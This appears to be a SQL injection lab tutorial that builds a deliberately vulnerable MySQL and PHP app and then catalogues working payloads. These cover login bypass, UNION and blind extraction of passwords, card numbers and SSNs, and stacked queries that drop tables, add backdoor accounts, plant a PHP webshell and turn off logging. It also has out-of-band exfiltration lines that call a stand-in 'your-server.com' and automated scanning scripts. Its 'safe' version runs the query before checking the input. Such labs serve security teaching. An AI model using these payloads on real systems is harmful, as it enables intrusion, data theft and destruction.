# Setting Up Your Test Environment

```sql
-- Create a vulnerable test database
CREATE DATABASE security_lab;
USE security_lab;

-- Users table with sensitive data
CREATE TABLE users (
    id INT PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(50),
    password VARCHAR(255),  -- In real apps, this should be hashed
    email VARCHAR(100),
    role VARCHAR(20) DEFAULT 'user',
    credit_card VARCHAR(16),
    ssn VARCHAR(11),
    is_admin BOOLEAN DEFAULT FALSE
);

-- Products table for search testing
CREATE TABLE products (
    id INT PRIMARY KEY AUTO_INCREMENT,
    name VARCHAR(100),
    description TEXT,
    price DECIMAL(10,2)
);

-- System information table
CREATE TABLE system_info (
    id INT PRIMARY KEY,
    db_version VARCHAR(50),
    server_path VARCHAR(255),
    config_data TEXT
);

-- Insert test data
INSERT INTO users VALUES 
(1, 'admin', 'admin123', 'admin@example.com', 'superadmin', '4532123456789012', '123-45-6789', TRUE),
(2, 'john_doe', 'password123', 'john@example.com', 'user', '4532987654321098', '987-65-4321', FALSE),
(3, 'jane_smith', 'letmein', 'jane@example.com', 'user', '4532567890123456', '456-78-9123', FALSE),
(4, 'bob_wilson', 'secret123', 'bob@example.com', 'moderator', '4532345678901234', '789-12-3456', FALSE);

INSERT INTO products VALUES 
(1, 'Laptop', 'High-performance laptop', 999.99),
(2, 'Mouse', 'Wireless mouse', 29.99),
(3, 'Keyboard', 'Mechanical keyboard', 149.99);

INSERT INTO system_info VALUES 
(1, '8.0.33', '/var/www/html/', 'secret_config_data');

-- Orders table for business logic attacks
CREATE TABLE orders (
    id INT PRIMARY KEY AUTO_INCREMENT,
    user_id INT,
    product_id INT,
    quantity INT,
    total DECIMAL(10,2),
    status VARCHAR(20),
    FOREIGN KEY (user_id) REFERENCES users(id)
);

INSERT INTO orders VALUES (1, 1, 1, 2, 1999.98, 'completed');
```

## Vulnerable PHP Backend

```php
<?php
// vulnerable_search.php - DELIBERATELY VULNERABLE FOR TESTING
$host = 'localhost';
$dbname = 'security_lab';
$username = 'root';
$password = '';

try {
    $pdo = new PDO("mysql:host=$host;dbname=$dbname", $username, $password);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch(PDOException $e) {
    die("Connection failed: " . $e->getMessage());
}

// VULNERABLE: Direct input concatenation
if (isset($_GET['search'])) {
    $search = $_GET['search'];
    
    // DANGEROUS: String concatenation in query
    $query = "SELECT * FROM products WHERE name LIKE '%$search%' OR description LIKE '%$search%'";
    
    echo "<h3>Executed Query:</h3>";
    echo "<pre>$query</pre>";
    
    try {
        $result = $pdo->query($query);
        echo "<h3>Results:</h3>";
        while ($row = $result->fetch(PDO::FETCH_ASSOC)) {
            print_r($row);
            echo "<br>";
        }
    } catch(PDOException $e) {
        echo "Error: " . $e->getMessage();
    }
}

// VULNERABLE: Login with injection
if (isset($_POST['login'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    $query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
    echo "<pre>$query</pre>";
    
    $result = $pdo->query($query);
    if ($result->rowCount() > 0) {
        echo "Login successful!";
        $user = $result->fetch(PDO::FETCH_ASSOC);
        print_r($user);
    } else {
        echo "Login failed!";
    }
}
?>

<!-- Search Form -->
<form method="GET">
    <input type="text" name="search" placeholder="Search products...">
    <input type="submit" value="Search">
</form>

<!-- Login Form -->
<form method="POST">
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="login" value="Login">
</form>
```

## Complete SQL Injection Examples Organized by Type

### TYPE 1: Authentication Bypass

```sql
-- BASIC AUTHENTICATION BYPASS
-- Input in username field:
' OR '1'='1
' OR 1=1 --
' OR 1=1 #
' OR 1=1 /*
admin' --
admin' #
admin'/*

-- Result query becomes:
SELECT * FROM users WHERE username='' OR '1'='1' AND password='anything'
-- Returns all users because '1'='1' is always true

-- SPECIFIC USER IMPERSONATION
-- Input: admin' --
-- Query becomes:
SELECT * FROM users WHERE username='admin' --' AND password='anything'
-- Comments out password check, logs in as admin

-- MULTIPLE CONDITION BYPASS
-- Input: ' OR '1'='1' LIMIT 1 --
-- Query becomes:
SELECT * FROM users WHERE username='' OR '1'='1' LIMIT 1 --' AND password=''
-- Gets first user (usually admin)

-- ADVANCED AUTH BYPASS
' OR 1=1 ORDER BY id DESC LIMIT 1 --
' UNION SELECT 1,'admin','password','admin@email.com','superadmin',NULL,NULL,1 --
```

### TYPE 2: UNION-Based Data Extraction

```sql
-- DETECTING NUMBER OF COLUMNS
-- Try incrementally until no error:
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
' ORDER BY 4 --
' ORDER BY 5 --
' ORDER BY 6 --
' ORDER BY 7 --
' ORDER BY 8 --
-- Stop when you get an error, previous number is column count

-- UNION SELECT WITH CORRECT COLUMNS (8 columns in users table)
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL --

-- FINDING VISIBLE COLUMNS
' UNION SELECT 1,2,3,4,5,6,7,8 --

-- EXTRACTING DATABASE INFORMATION
' UNION SELECT 1,database(),user(),version(),5,6,7,8 --

-- EXTRACTING ALL DATABASES
' UNION SELECT 1,GROUP_CONCAT(SCHEMA_NAME),3,4,5,6,7,8 FROM information_schema.SCHEMATA --

-- EXTRACTING TABLES FROM CURRENT DATABASE
' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6,7,8 FROM information_schema.tables WHERE table_schema=database() --

-- EXTRACTING COLUMNS FROM users TABLE
' UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5,6,7,8 FROM information_schema.columns WHERE table_name='users' --

-- EXTRACTING ALL USERNAMES AND PASSWORDS
' UNION SELECT 1,username,password,email,role,credit_card,ssn,is_admin FROM users --

-- EXTRACTING WITH CONCATENATION
' UNION SELECT 1,CONCAT(username,':',password,':',email,':',credit_card),3,4,5,6,7,8 FROM users --

-- EXTRACTING FROM OTHER DATABASES
' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6,7,8 FROM information_schema.tables WHERE table_schema='mysql' --

-- READING FILES (if FILE privilege exists)
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5,6,7,8 --
' UNION SELECT 1,LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts'),3,4,5,6,7,8 --
```

### TYPE 3: Boolean-Based Blind Injection

```sql
-- VERIFYING VULNERABILITY
-- True condition (should return results):
' AND 1=1 --
-- False condition (should return no results):
' AND 1=2 --

-- EXTRACTING DATABASE NAME LENGTH
' AND LENGTH(database())=12 --  -- Try different numbers
' AND LENGTH(database())>10 --

-- EXTRACTING DATABASE NAME CHARACTER BY CHARACTER
' AND ASCII(SUBSTRING(database(),1,1))=115 --  -- 115 = 's' for 'security_lab'
' AND ASCII(SUBSTRING(database(),2,1))=101 --  -- 101 = 'e'
' AND ASCII(SUBSTRING(database(),3,1))=99  --  -- 99 = 'c'

-- EXTRACTING TABLE NAMES
' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))>100 --

-- EXTRACTING PASSWORD FOR SPECIFIC USER
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97 --  -- 97 = 'a'
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),2,1))=100 -- -- 100 = 'd'

-- COUNTING USERS
' AND (SELECT COUNT(*) FROM users)>3 --
' AND (SELECT COUNT(*) FROM users)=4 --

-- CHECKING IF USER EXISTS
' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0 --
' AND (SELECT COUNT(*) FROM users WHERE username LIKE '%admin%')>0 --

-- FINDING USERS WITH SPECIFIC ROLES
' AND (SELECT COUNT(*) FROM users WHERE role='superadmin')>0 --
```

### TYPE 4: Time-Based Blind Injection

```sql
-- BASIC TIME DELAY (MySQL)
' AND SLEEP(5) --
' AND IF(1=1,SLEEP(5),0) --

-- TIME-BASED VERSION DETECTION
' AND IF(MID(VERSION(),1,1)='8',SLEEP(5),0) --
' AND IF(MID(VERSION(),1,1)='5',SLEEP(5),0) --

-- TIME-BASED DATABASE NAME EXTRACTION
' AND IF(ASCII(SUBSTRING(database(),1,1))=115,SLEEP(5),0) --
' AND IF(ASCII(SUBSTRING(database(),2,1))=101,SLEEP(5),0) --

-- TIME-BASED TABLE EXTRACTION
' AND IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))>100,SLEEP(5),0) --

-- TIME-BASED PASSWORD EXTRACTION (slower but reliable)
' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97,SLEEP(3),0) --

-- HEAVY QUERY TIME-BASED (alternative if SLEEP blocked)
' AND BENCHMARK(5000000,MD5('test')) --
' AND BENCHMARK(10000000,SHA1('test')) --

-- CONDITIONAL HEAVY QUERY
' AND IF(1=1,BENCHMARK(10000000,MD5('test')),0) --
```

### TYPE 5: Error-Based Injection

```sql
-- EXTRACTVALUE TECHNIQUE (MySQL)
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()))) --
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version))) --
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()))) --

-- EXTRACTING TABLES WITH ERRORS
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()))) --

-- EXTRACTING COLUMNS (may need substring for large results)
' AND EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'),1,30))) --

-- UPDATEXML TECHNIQUE
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1) --
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT password FROM users WHERE username='admin')),1) --

-- DOUBLE QUERY (Subquery returns multiple rows error)
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x)a) --

-- ADVANCED DOUBLE QUERY FOR DATA EXTRACTION
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users WHERE username='admin'),FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x)a) --
```

### TYPE 6: Stacked Queries (If Supported)

```sql
-- CREATING NEW ADMIN USER
'; INSERT INTO users (username, password, email, role, is_admin) VALUES ('hacker','password','hacker@evil.com','superadmin',1) --

-- MODIFYING EXISTING USER ROLES
'; UPDATE users SET role='superadmin', is_admin=1 WHERE username='your_username' --

-- DELETING DATA
'; DELETE FROM users WHERE username='admin' --
'; DROP TABLE orders --

-- EXTRACTING DATA TO FILE
'; SELECT username,password FROM users INTO OUTFILE '/var/www/html/credentials.txt' --

-- WRITING WEBSHELL
'; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php' --

-- CREATING BACKDOOR USER (MySQL)
'; INSERT INTO mysql.user (Host,User,authentication_string) VALUES ('%','backdoor','*hash_here') --
'; FLUSH PRIVILEGES --

-- DISABLING LOGGING
'; SET global general_log = 0 --
'; SET global log_error = 0 --
```

### TYPE 7: Blind Out-of-Band (OOB) Exfiltration

```sql
-- DNS EXFILTRATION (requires FILE privilege)
'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE username='admin'),'.your-server.com\\test.txt')) --

-- HTTP EXFILTRATION (MySQL doesn't support directly, but possible via UDF)
'; SELECT sys_eval(CONCAT('curl http://your-server.com/?data=',(SELECT password FROM users WHERE username='admin'))) --
```

### TYPE 8: Second-Order Injection

```sql
-- STEP 1: INSERT MALICIOUS DATA
-- Input for username field: admin' OR '1'='1' --
-- This gets stored in database as literal text

-- STEP 2: APPLICATION USES STORED DATA IN ANOTHER QUERY
-- Some feature that reads usernames and uses them:
SELECT * FROM messages WHERE receiver='admin' OR '1'='1'
-- This executes the injected code

-- ADVANCED SECOND-ORDER: TRIGGER CREATION
'; CREATE TRIGGER backdoor BEFORE INSERT ON users 
   FOR EACH ROW SET NEW.role='superadmin', NEW.is_admin=1 --
```

### TYPE 9: Advanced Search Query Exploitation

```sql
-- UNION-BASED SEARCH EXTRACTION
-- Search: ' UNION SELECT 1,username,password,4 FROM users --

-- ERROR-BASED SEARCH
-- Search: ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(credit_card) FROM users))) --

-- BLIND SEARCH EXTRACTION
-- Search: ' AND (SELECT COUNT(*) FROM users WHERE credit_card LIKE '4%')>0 --
-- Search: ' AND (SELECT COUNT(*) FROM users WHERE ssn LIKE '123%')>0 --

-- TIME-BASED SEARCH
-- Search: ' AND IF((SELECT LENGTH(password) FROM users WHERE username='admin')>5,SLEEP(3),0) --

-- OUT-OF-BAND SEARCH (if applicable)
-- Search: ' UNION SELECT 1,LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.your-server.com\\')),3,4 --
```

### TYPE 10: HTTP Header Injection Points

```sql
-- USER-AGENT INJECTION
-- User-Agent: ' UNION SELECT 1,2,3,4 FROM information_schema.tables --

-- REFERER INJECTION
-- Referer: ' OR '1'='1

-- X-FORWARDED-FOR INJECTION
-- X-Forwarded-For: 127.0.0.1' UNION SELECT username,password FROM users --

-- COOKIE INJECTION
-- Cookie: session=' OR '1'='1
```

## Testing Your Search Function

```php
<?php
// test_injections.php - Automated testing script

$url = "http://localhost/vulnerable_search.php";

$payloads = [
    // Basic search tests
    "Laptop",
    
    // Comment injections
    "' -- ",
    "' # ",
    "' /*",
    
    // Boolean tests
    "' OR '1'='1",
    "' OR 1=1 --",
    "' AND 1=1 --",
    "' AND 1=2 --",
    
    // Union tests
    "' UNION SELECT 1,2,3,4 --",
    "' UNION SELECT 1,@@version,3,4 --",
    "' UNION SELECT 1,database(),3,4 --",
    "' UNION SELECT 1,user(),3,4 --",
    
    // Union data extraction
    "' UNION SELECT 1,GROUP_CONCAT(username,':',password),3,4 FROM users --",
    "' UNION SELECT 1,GROUP_CONCAT(email,':',credit_card),3,4 FROM users --",
    
    // Error-based
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,database())) --",
    "' AND UPDATEXML(1,CONCAT(0x7e,@@version),1) --",
    
    // Time-based
    "' AND SLEEP(5) --",
    "' AND BENCHMARK(10000000,MD5('test')) --",
    
    // Blind extraction
    "' AND LENGTH(database())=12 --",
    "' AND ASCII(SUBSTRING(database(),1,1))=115 --",
    
    // Stacked queries (if supported)
    "'; INSERT INTO users (username,password) VALUES ('test','test') --",
    
    // File operations (if FILE privilege)
    "' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4 --",
    
    // Comment bypass variations
    "'/**/OR/**/1=1/**/--",
    "'%0AOR%0A1=1%0A--",
    
    // Case variation
    "' uNiOn SeLeCt 1,2,3,4 FrOm UsErS --",
    
    // Encoding variations
    "%27%20OR%201=1%20--",
    "%27%20UNION%20SELECT%201,2,3,4%20--"
];

foreach ($payloads as $payload) {
    echo "\nTesting: " . $payload . "\n";
    $url_encoded = $url . "?search=" . urlencode($payload);
    
    $ch = curl_init($url_encoded);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Timeout for SLEEP payloads
    
    $start = microtime(true);
    $response = curl_exec($ch);
    $time = microtime(true) - $start;
    
    if (curl_errno($ch)) {
        echo "Error: " . curl_error($ch) . "\n";
    } else {
        echo "Time: " . round($time, 2) . "s\n";
        echo "Response length: " . strlen($response) . "\n";
        
        // Check for interesting patterns
        if (strpos($response, 'admin') !== false) {
            echo "*** FOUND SENSITIVE DATA! ***\n";
        }
        if ($time > 3) {
            echo "*** TIME-BASED VULNERABILITY DETECTED! ***\n";
        }
    }
    
    curl_close($ch);
    sleep(1); // Be nice to your server
}
?>
```

## Testing Results - What Happens

```sql
-- When you search these, here's what the queries become:

-- Input: Laptop
-- Query: SELECT * FROM products WHERE name LIKE '%Laptop%' OR description LIKE '%Laptop%'
-- Result: Normal search, returns laptop product

-- Input: ' OR '1'='1
-- Query: SELECT * FROM products WHERE name LIKE '%' OR '1'='1%' OR description LIKE '%' OR '1'='1%'
-- Result: Returns ALL products because condition is always true

-- Input: ' UNION SELECT 1,username,password,4 FROM users --
-- Query: SELECT * FROM products WHERE name LIKE '%' UNION SELECT 1,username,password,4 FROM users -- %' OR description LIKE '%...
-- Result: Returns all usernames and passwords from users table!

-- Input: ' AND SLEEP(5) --
-- Query: SELECT * FROM products WHERE name LIKE '%' AND SLEEP(5) -- %' OR description LIKE '%...
-- Result: Server delays 5 seconds before responding (confirming vulnerability)

-- Input: ' AND EXTRACTVALUE(1,CONCAT(0x7e,database())) --
-- Query: SELECT * FROM products WHERE name LIKE '%' AND EXTRACTVALUE(1,CONCAT(0x7e,database())) -- %'...
-- Result: Error message reveals database name: "XPATH error: ~security_lab"
```

## Safe Implementation for Comparison

```php
<?php
// safe_search.php - PROPERLY SECURED

// SAFE: Parameterized queries
if (isset($_GET['search'])) {
    $search = "%{$_GET['search']}%";
    
    $stmt = $pdo->prepare("SELECT * FROM products WHERE name LIKE ? OR description LIKE ?");
    $stmt->execute([$search, $search]);
    
    // Input validation
    $input = $_GET['search'];
    if (preg_match('/[\'";\\\]/', $input)) {
        die("Invalid characters detected");
    }
    
    // Whitelist approach
    $allowed_pattern = '/^[a-zA-Z0-9\s\-]+$/';
    if (!preg_match($allowed_pattern, $input)) {
        die("Invalid search pattern");
    }
}

// SAFE: Login with prepared statements
if (isset($_POST['login'])) {
    $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
    $stmt->execute([$_POST['username'], $_POST['password']]);
    
    // Even better: hash passwords!
    // $stmt->execute([$_POST['username'], password_hash($_POST['password'], PASSWORD_DEFAULT)]);
}
?>
```

## Automated SQL Injection Detection Script

```python
#!/usr/bin/env python3
"""
sql_injection_tester.py - Test your own endpoints
ONLY USE ON SYSTEMS YOU OWN
"""

import requests
import time
from urllib.parse import urlencode

class SQLiTester:
    def __init__(self, base_url, param_name):
        self.base_url = base_url
        self.param = param_name
        self.session = requests.Session()
        
    def test_payload(self, payload, test_type):
        """Test a single payload"""
        params = {self.param: payload}
        
        start_time = time.time()
        try:
            response = self.session.get(
                self.base_url, 
                params=params,
                timeout=10
            )
            elapsed = time.time() - start_time
            
            return {
                'payload': payload,
                'type': test_type,
                'status': response.status_code,
                'length': len(response.text),
                'time': elapsed,
                'has_error': self.check_errors(response.text),
                'response': response.text[:500]
            }
        except requests.Timeout:
            return {
                'payload': payload,
                'type': test_type,
                'status': 'timeout',
                'length': 0,
                'time': 10.0,
                'has_error': False,
                'response': ''
            }
    
    def check_errors(self, text):
        """Check for SQL errors in response"""
        errors = [
            'SQL syntax',
            'mysql_fetch',
            'MySQL Error',
            'ORA-',
            'SQLSTATE',
            'unclosed quotation mark',
            'Microsoft OLE DB'
        ]
        return any(error.lower() in text.lower() for error in errors)
    
    def run_all_tests(self):
        """Run comprehensive test suite"""
        tests = []
        
        # Boolean-based tests
        for payload in ["' OR '1'='1", "' OR 1=1 --", "' AND 1=1 --", "' AND 1=2 --"]:
            tests.append(self.test_payload(payload, 'boolean'))
        
        # Union-based tests
        for payload in [
            "' ORDER BY 1 --",
            "' UNION SELECT 1,2,3,4 --",
            "' UNION SELECT 1,@@version,3,4 --"
        ]:
            tests.append(self.test_payload(payload, 'union'))
        
        # Time-based tests
        for payload in [
            "' AND SLEEP(5) --",
            "' AND BENCHMARK(5000000,MD5('test')) --"
        ]:
            tests.append(self.test_payload(payload, 'time-based'))
        
        # Error-based tests
        for payload in [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version)) --",
            "' AND UPDATEXML(1,CONCAT(0x7e,database()),1) --"
        ]:
            tests.append(self.test_payload(payload, 'error-based'))
        
        return self.analyze_results(tests)
    
    def analyze_results(self, tests):
        """Analyze test results for vulnerabilities"""
        print("\n=== SQL Injection Test Results ===\n")
        
        for test in tests:
            print(f"Payload: {test['payload']}")
            print(f"Type: {test['type']}")
            print(f"Status: {test['status']}")
            print(f"Response Length: {test['length']}")
            print(f"Response Time: {test['time']:.2f}s")
            
            # Detect vulnerabilities
            if test['has_error']:
                print("⚠️  ERROR-BASED SQLi DETECTED!")
            if test['time'] > 4.0:
                print("⚠️  TIME-BASED SQLi DETECTED!")
            
            print("-" * 50)
        
        # Summary
        boolean_tests = [t for t in tests if t['type'] == 'boolean']
        if len(boolean_tests) >= 2:
            if boolean_tests[0]['length'] != boolean_tests[1]['length']:
                print("\n⚠️  BOOLEAN-BASED SQLi DETECTED!")
        
        time_tests = [t for t in tests if t['type'] == 'time-based']
        if any(t['time'] > 4.0 for t in time_tests):
            print("⚠️  TIME-BASED SQLi CONFIRMED!")

# Usage
if __name__ == "__main__":
    # Test your own application
    tester = SQLiTester(
        "http://localhost/vulnerable_search.php",
        "search"
    )
    tester.run_all_tests()
```

## What to Observe During Testing

### Expected Vulnerable Behaviors

```sql
-- 1. Error Messages Revealing Database Structure
-- If you see: "You have an error in your SQL syntax near '' at line 1"
-- This means: Your input is being inserted directly into SQL query

-- 2. Different Response Sizes
-- Search: Laptop → 500 bytes response
-- Search: ' OR '1'='1 → 2000 bytes response
-- This means: Injection changed the query results

-- 3. Time Delays
-- Search: Normal → instant response
-- Search: ' AND SLEEP(5) -- → 5 second delay
-- This means: Time-based injection possible

-- 4. Unexpected Data in Results
-- Search: Laptop' UNION SELECT 1,username,2,4 FROM users --
-- If you see: john_doe, jane_smith in results
-- This means: Successfully extracted data from other tables
```

## Important Security Notes

```sql
-- WHAT MAKES THE SEARCH VULNERABLE:
-- 1. String concatenation instead of parameterized queries
-- 2. No input validation
-- 3. Direct execution of user input
-- 4. Error messages exposed to users

-- HOW TO FIX:
-- 1. Use prepared statements ALWAYS
-- 2. Validate and sanitize all inputs
-- 3. Implement least privilege database accounts
-- 4. Use stored procedures when possible
-- 5. Hide detailed error messages
-- 6. Implement WAF (Web Application Firewall)

-- SAFE PATTERN:
PREPARE stmt FROM 'SELECT * FROM products WHERE name LIKE ? OR description LIKE ?';
EXECUTE stmt USING @search_term, @search_term;
```
